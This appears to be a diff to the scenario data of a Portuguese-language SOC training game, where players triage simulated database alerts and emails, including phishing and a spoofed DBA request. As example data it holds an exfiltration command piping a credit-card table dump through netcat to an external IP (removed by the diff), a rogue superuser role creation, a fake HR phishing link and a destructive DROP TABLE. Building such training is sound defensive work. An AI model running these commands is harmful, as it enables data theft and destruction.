@@ -221,13 +221,21 @@ const CAMPAIGN_SHIFTS = [
       <h2>1. DIRETRIZES DE BANCO DE DADOS (TECHDB / POSTGRESQL)</h2>
       <p>O acesso e operações no Banco de Dados Central de Produção (PostgreSQL) seguem regras rígidas:</p>
       <ul>
-        <li><code>db_admin_prod</code>: Usuário exclusivo da equipe interna de DBA para manutenções programadas (VACUUM, REINDEX).</li>
-        <li><code>app_checkout_service</code>: Usuário de serviço automatizado da API de pagamentos (somente DML restrito de ordens PIX).</li>
-        <li><strong>Proibições Estritas:</strong> Comandos com <code>UNION SELECT</code> em campos de formulário, criação de roles com atributo <code>SUPERUSER</code> e comandos <code>pg_dump</code> direcionados para IPs externos.</li>
+        <li><code>dba_ops_techcore</code>: Usuário exclusivo da equipe de DBA para manutenções programadas (VACUUM, REINDEX, ANALYZE).</li>
+        <li><code>svc_payment_api</code>: Usuário de serviço da API de pagamentos — apenas SELECT e INSERT em tabelas de transações PIX autorizadas.</li>
+        <li><code>reporting_reader</code>: Usuário somente-leitura do sistema de relatórios gerenciais — apenas SELECT em views de BI.</li>
+        <li><strong>Proibições Estritas:</strong> Comandos com <code>UNION SELECT</code> em campos de formulário, criação de roles com atributo <code>SUPERUSER</code>, comandos <code>pg_dump</code> direcionados para IPs externos e DROP TABLE sem ticket aprovado.</li>
       </ul>
 
-      <h2>2. MONITORAMENTO CONTÍNUO DE E-MAILS E CI/CD</h2>
-      <p>Mesmo durante a auditoria de banco de dados, e-mails de phishing de engenharia social (ex: <code>@tech-core.com</code> com hífen) e alterações maliciosas em workflows de CI/CD continuam ativos.</p>
+      <h2>2. COLABORADORES AUTORIZADOS PARA OPERAÇÕES CRÍTICAS DE DB</h2>
+      <ul>
+        <li><code>fernanda.dba@techcore.com</code>: DBA Sênior — responsável por janelas de manutenção autorizadas.</li>
+        <li><code>rodrigo.infra@techcore.com</code>: DevOps — autorizado apenas para operações de REINDEX e ANALYZE via pipeline.</li>
+        <li><strong>Atenção:</strong> Qualquer solicitação de operação crítica por e-mail proveniente de domínio diferente de <code>@techcore.com</code> deve ser negada imediatamente.</li>
+      </ul>
+
+      <h2>3. MONITORAMENTO CONTÍNUO DE E-MAILS E CI/CD</h2>
+      <p>Mesmo durante a auditoria de banco de dados, e-mails de phishing (ex: <code>@tech-core.com</code> com hífen ou <code>@techcore-beneficios.com</code>) e alterações maliciosas em workflows de CI/CD continuam ativos.</p>
     `,
     ceoDialogues: [
       {
@@ -247,8 +255,8 @@ const CAMPAIGN_SHIFTS = [
       {
         step: 3,
         text: `
-          <p>Lembre-se: usuários autorizados no banco são apenas <code>db_admin_prod</code> e <code>app_checkout_service</code>.</p>
-          <p>Você pode errar <strong>no máximo 2 itens</strong> para ser promovido. Mantenha o foco e bom turno!</p>
+          <p>Lembre-se: usuários autorizados no banco são <code>dba_ops_techcore</code>, <code>svc_payment_api</code> e <code>reporting_reader</code>.</p>
+          <p>Solicitações de DBA por e-mail só são válidas vindas de <code>@techcore.com</code>. Fique de olho nos domínios! Você pode errar <strong>no máximo 2 itens</strong> para ser promovido.</p>
         `
       }
     ],
@@ -293,18 +301,18 @@ const CAMPAIGN_SHIFTS = [
         id: 's2-3',
         channel: 'db',
         time: '12:15',
-        senderName: 'app_checkout_service (TechDB)',
-        senderEmail: 'checkout-cron@techcore.internal',
-        avatarChar: 'C',
+        senderName: 'svc_payment_api (TechDB)',
+        senderEmail: 'svc-payment@techcore.internal',
+        avatarChar: 'P',
         avatarColor: '#10b981',
         subject: 'Query Rotineira: Fechamento de Lote de Transações PIX',
         snippet: 'SELECT status, count(*), sum(amount) FROM pix_transactions WHERE created_at >= NOW() - INTERVAL 1 HOUR...',
-        meta: { 'Usuário': 'app_checkout_service', 'Banco': 'techcore_payments_prod', 'Data': '12:12', 'Assinatura': 'Serviço Interno Autorizado' },
+        meta: { 'Usuário': 'svc_payment_api', 'Banco': 'techcore_payments_prod', 'Data': '12:12', 'Assinatura': 'Serviço Interno Autorizado' },
         body: `<p>Auditoria de Query de Aplicação:</p><div class="email-quote-box"><p>Consulta agendada de agregação financeira de transações concluídas nas últimas horas.</p></div>`,
         inspector: { type: 'url', label: 'Auditoria de Query SQL', dest: 'SELECT status, count(*), sum(amount) FROM pix_transactions WHERE created_at >= NOW() - INTERVAL \'1 hour\' GROUP BY status;' },
         actions: [
-          { id: 'a1', label: '✅ Autorizar Execução da Query', correct: true, toastMsg: 'Query autorizada.', logTitle: 'Operação de Banco Legítima', consequence: 'Fechamento financeiro horário concluído sem interrupção.', explanation: 'Query legítima de agregação executada pela conta autorizada app_checkout_service.' },
-          { id: 'a2', label: '🚨 Matar Processo e Bloquear Usuário', correct: false, toastMsg: 'Processo encerrado.', logTitle: 'Falso Positivo em Serviço de Pagamentos', consequence: 'O checkout PIX da empresa parou de consolidar pagamentos de clientes.', explanation: 'app_checkout_service é o usuário oficial de pagamentos da TechCore conforme o Word.' }
+          { id: 'a1', label: '✅ Autorizar Execução da Query', correct: true, toastMsg: 'Query autorizada.', logTitle: 'Operação de Banco Legítima', consequence: 'Fechamento financeiro horário concluído sem interrupção.', explanation: 'Query legítima de agregação executada pela conta autorizada svc_payment_api.' },
+          { id: 'a2', label: '🚨 Matar Processo e Bloquear Usuário', correct: false, toastMsg: 'Processo encerrado.', logTitle: 'Falso Positivo em Serviço de Pagamentos', consequence: 'O checkout PIX da empresa parou de consolidar pagamentos de clientes.', explanation: 'svc_payment_api é o usuário oficial de pagamentos da TechCore conforme o Word.' }
         ]
       },
       {
@@ -326,39 +334,75 @@ const CAMPAIGN_SHIFTS = [
         ]
       },
       {
-        id: 's2-5',
-        channel: 'db',
-        time: '16:00',
-        senderName: 'Auditor de Sessão Postgres',
-        senderEmail: 'pg-audit@techcore.internal',
-        avatarChar: 'P',
-        avatarColor: '#f59e0b',
-        subject: '[ALERTA DDL] Criação de Role Superuser no Banco Principal',
-        snippet: 'CREATE ROLE shadow_admin WITH SUPERUSER LOGIN PASSWORD "root_pwned_2026";...',
-        meta: { 'Conexão': 'Sessão remota porta 5432', 'Banco': 'techcore_main_db', 'Data': '15:58', 'Comando': 'DDL Privilege Escalation' },
-        body: `<p>Comando DDL detectado nos logs de auditoria do banco principal:</p><div class="email-quote-box"><p><code>CREATE ROLE shadow_admin WITH SUPERUSER LOGIN PASSWORD 'root_pwned_2026';</code><br><code>GRANT ALL PRIVILEGES ON ALL TABLES TO shadow_admin;</code></p></div>`,
-        inspector: { type: 'url', label: 'Inspeção de Privilégios DDL', dest: 'CREATE ROLE shadow_admin WITH SUPERUSER LOGIN PASSWORD \'root_pwned_2026\';' },
+        id: 's2-7',
+        channel: 'email',
+        time: '08:55',
+        senderName: 'Fernanda Lima - DBA',
+        senderEmail: 'fernanda.dba@techcore.com',
+        avatarChar: 'F',
+        avatarColor: '#7b5ea7',
+        subject: 'Janela de Manutenção DB: REINDEX Programado para 09h00',
+        snippet: 'Bom dia, realizarei o REINDEX rotineiro no banco de produção agora às 9h...',
+        meta: { 'De': 'fernanda.dba@techcore.com', 'Para': 'soc-team@techcore.com', 'Data': '08:53', 'Segurança': 'SPF: PASS | DKIM: OK' },
+        body: `<p>Bom dia, equipe SOC,</p><div class="email-quote-box"><p>Comunicado de janela de manutenção programada.<br>Usuário: <code>dba_ops_techcore</code> realizará <code>REINDEX DATABASE techcore_main_db;</code> às 09h00 conforme ticket <strong>#DBA-2026-119</strong> aprovado pela gestão.</p></div>`,
+        inspector: { type: 'url', label: 'Verificação de Remetente', dest: 'De: fernanda.dba@techcore.com | SPF: PASS | Ticket: #DBA-2026-119' },
         actions: [
-          { id: 'a1', label: '🚫 Revogar Role, Fechar Porta 5432 e Trocar Senhas', correct: true, toastMsg: 'Backdoor no DB revogado.', logTitle: 'Backdoor no PostgreSQL Neutralizado', consequence: 'Role não autorizada removida e acesso direto restrito à VPN.', explanation: 'O manual do Word proíbe explicitamente a criação de roles superuser sem autorização formal.' },
-          { id: 'a2', label: '✅ Aprovar Criação do Usuário', correct: false, toastMsg: 'Usuário criado.', logTitle: 'Comprometimento Total do Banco', consequence: 'O atacante assumiu o controle total de todas as tabelas da empresa.', explanation: 'Criação de superuser não autorizada no banco de dados de produção.' }
+          { id: 'a1', label: '✅ Confirmar Janela e Autorizar Operação', correct: true, toastMsg: 'Janela de manutenção confirmada.', logTitle: 'Manutenção Legítima Autorizada', consequence: 'O REINDEX de banco foi executado com sucesso, melhorando a performance em 30%.', explanation: 'Fernanda é a DBA sênior autorizada conforme o Word. Domínio, SPF e ticket estão todos corretos.' },
+          { id: 'a2', label: '🚫 Bloquear Operação e Escalar para o CISO', correct: false, toastMsg: 'Operação negada.', logTitle: 'Falso Positivo — Manutenção Bloqueada', consequence: 'O banco ficou degradado por falta de manutenção e causou lentidão nos pagamentos.', explanation: 'Fernanda é colaboradora autorizada com domínio oficial e ticket aprovado.' }
         ]
       },
       {
-        id: 's2-6',
-        channel: 'db',
-        time: '17:30',
-        senderName: 'Data Exfil Sensor',
-        senderEmail: 'dlp-sensor@techcore.internal',
-        avatarChar: 'D',
-        avatarColor: '#e11d48',
-        subject: '[DLP ALERTA] pg_dump de Cartões de Crédito para Netcat Externo',
-        snippet: 'Comando pg_dump -t credit_cards | nc 198.51.100.99 4444 em execução...',
-        meta: { 'Processo': 'pg_dump -t credit_cards', 'Destino': '198.51.100.99:4444', 'Data': '17:28', 'DLP Status': 'ALERTA MÁXIMO' },
-        body: `<p>Processo de extração de dados financeiros detectado:</p><div class="email-quote-box"><p><code>pg_dump -h localhost -U postgres -t credit_cards techcore_prod | nc 198.51.100.99 4444</code></p></div>`,
-        inspector: { type: 'url', label: 'Inspeção de Processo de Rede', dest: 'pg_dump -t credit_cards | nc 198.51.100.99 4444' },
+        id: 's2-8',
+        channel: 'email',
+        time: '11:20',
+        senderName: 'Suporte TechCore — RH',
+        senderEmail: 'rh-noreply@techcore-beneficios.com',
+        avatarChar: 'R',
+        avatarColor: '#c0392b',
+        subject: '[AÇÃO REQUERIDA] Atualização de Benefícios — Clique para Confirmar Seus Dados',
+        snippet: 'Prezado colaborador, para garantir seu vale-alimentação de setembro confirme seus dados bancários...',
+        meta: { 'De': 'rh-noreply@techcore-beneficios.com', 'Para': 'todos@techcore.com', 'Data': '11:18', 'Segurança': 'SPF: FAIL | Domínio Externo' },
+        body: `<p>Prezado Colaborador,</p><div class="email-quote-box"><p>Para garantir o recebimento do seu <strong>vale-alimentação de setembro</strong>, acesse o portal e confirme seus dados bancários:<br><code>https://portal-rh.techcore-beneficios.com/confirmar-conta</code><br><br>Prazo: <strong>Hoje até 12h00</strong>. Após esse horário os dados não poderão ser alterados.</p></div>`,
+        inspector: { type: 'url', label: 'Inspeção de Domínio de RH', dest: 'https://portal-rh.techcore-beneficios.com/confirmar-conta' },
         actions: [
-          { id: 'a1', label: '🚨 Matar Processo, Cortar Conexão de Rede e Isolar Servidor', correct: true, toastMsg: 'Exfiltração abortada.', logTitle: 'Vazamento de Cartões Interceptado', consequence: 'Conexão com IP do atacante cortada em menos de 10 segundos. Dados preservados.', explanation: 'Ação rápida e precisa para conter uma tentativa crítica de roubo de dados bancários.' },
-          { id: 'a2', label: '⚪ Aguardar Término do Processo', correct: false, toastMsg: 'Dump finalizado.', logTitle: 'Vazamento Massivo de Cartões de Crédito', consequence: 'Milhares de cartões de clientes foram vazados e a empresa sofreu multas pesadas da LGPD.', explanation: 'pg_dump para IP externo via netcat é um clássico ataque de exfiltração.' }
+          { id: 'a1', label: '📧 Confirmar Dados e Clicar no Link', correct: false, toastMsg: 'Dados bancários enviados.', logTitle: 'Phishing de RH — Dados Financeiros Comprometidos', consequence: 'Centenas de colaboradores tiveram dados bancários capturados pelo domínio falso.', explanation: 'O domínio @techcore-beneficios.com é externo e não pertence à TechCore. O Word informa que apenas @techcore-hr.com é válido para RH.' },
+          { id: 'a2', label: '🛡️ Reportar Phishing e Alertar Todos os Colaboradores', correct: true, toastMsg: 'Alerta de phishing emitido.', logTitle: 'Campanha de Phishing de RH Bloqueada', consequence: 'Domínio malicioso bloqueado no proxy e equipe alertada via comunicado interno.', explanation: 'Excelente! Domínio @techcore-beneficios.com é falso. RH oficial usa apenas @techcore-hr.com conforme o Word.' }
+        ]
+      },
+      {
+        id: 's2-9',
+        channel: 'email',
+        time: '13:05',
+        senderName: 'Rodrigo Alves — DevOps',
+        senderEmail: 'rodrigo.infra@techcore.com',
+        avatarChar: 'V',
+        avatarColor: '#1565c0',
+        subject: 'Pipeline CI/CD: Solicito Autorização de ANALYZE no Banco de Staging',
+        snippet: 'Olá SOC, preciso rodar ANALYZE no banco de staging para otimizar as queries do deploy de sexta...',
+        meta: { 'De': 'rodrigo.infra@techcore.com', 'Para': 'soc-team@techcore.com', 'Data': '13:03', 'Segurança': 'SPF: PASS | DKIM: OK' },
+        body: `<p>Olá equipe SOC,</p><div class="email-quote-box"><p>Solicito autorização para rodar <code>ANALYZE techcore_staging_db;</code> via usuário <code>dba_ops_techcore</code> no banco de <strong>staging</strong> (não produção) às 14h, antes do deploy da sexta-feira.<br>Ticket de referência: <strong>#OPS-2026-77</strong>.</p></div>`,
+        inspector: { type: 'url', label: 'Verificação de Remetente', dest: 'De: rodrigo.infra@techcore.com | SPF: PASS | Banco: techcore_staging_db (NÃO produção)' },
+        actions: [
+          { id: 'a1', label: '✅ Autorizar ANALYZE no Staging', correct: true, toastMsg: 'Autorização concedida.', logTitle: 'Operação DevOps Autorizada', consequence: 'O banco de staging foi otimizado e o deploy de sexta foi executado sem falhas.', explanation: 'Rodrigo é DevOps autorizado conforme o Word e a operação é no banco de staging, não em produção.' },
+          { id: 'a2', label: '🚫 Negar — Operações de DB São Exclusivas da DBA Fernanda', correct: false, toastMsg: 'Operação negada.', logTitle: 'Falso Positivo — DevOps Bloqueado', consequence: 'O deploy de sexta falhou por falta de otimização no banco de staging.', explanation: 'O Word autoriza Rodrigo para ANALYZE e REINDEX via pipeline. Negação incorreta.' }
+        ]
+      },
+      {
+        id: 's2-10',
+        channel: 'email',
+        time: '15:40',
+        senderName: 'Fernanda Lima (DBA)',
+        senderEmail: 'fernanda.dba@techcore-ops.net',
+        avatarChar: 'F',
+        avatarColor: '#c0392b',
+        subject: 'URGENTE: DROP TABLE logs_antigos — Preciso de Autorização Agora',
+        snippet: 'Oi, estou em reunião e meu e-mail corporativo caiu. Preciso que você aprove o DROP TABLE urgente...',
+        meta: { 'De': 'fernanda.dba@techcore-ops.net', 'Para': 'soc-team@techcore.com', 'Data': '15:38', 'Segurança': 'SPF: FAIL | Domínio Externo' },
+        body: `<p>Oi time SOC,</p><div class="email-quote-box"><p>Estou em reunião urgente com o cliente e meu e-mail <code>@techcore.com</code> caiu. Estou mandando desse e-mail alternativo.<br>Preciso que você execute agora: <code>DROP TABLE logs_antigos CASCADE;</code> no banco de produção. Ticket vou mandar depois, é urgente!</p></div>`,
+        inspector: { type: 'url', label: 'Verificação de Domínio do Remetente', dest: 'De: fernanda.dba@techcore-ops.net | SPF: FAIL | Domínio: techcore-ops.net (EXTERNO)' },
+        actions: [
+          { id: 'a1', label: '✅ Executar DROP TABLE — Confio na Fernanda', correct: false, toastMsg: 'Tabela destruída.', logTitle: 'Spear Phishing: Logs de Auditoria Apagados', consequence: 'Tabela de logs de auditoria destruída permanentemente. Compliance da empresa comprometido.', explanation: 'O domínio @techcore-ops.net é externo e suspeito. O Word exige que solicitações de DBA venham apenas de @techcore.com.' },
+          { id: 'a2', label: '🚫 Negar Operação — Domínio Externo Suspeito', correct: true, toastMsg: 'Operação negada e remetente reportado.', logTitle: 'Spear Phishing de DBA Neutralizado', consequence: 'Tentativa de apagar logs de auditoria interceptada. Incidente registrado para forense.', explanation: 'Perfeito! Spear phishing se passando pela Fernanda mas com domínio externo @techcore-ops.net. DROP TABLE em produção sem ticket é proibido.' }
         ]
       }
     ]
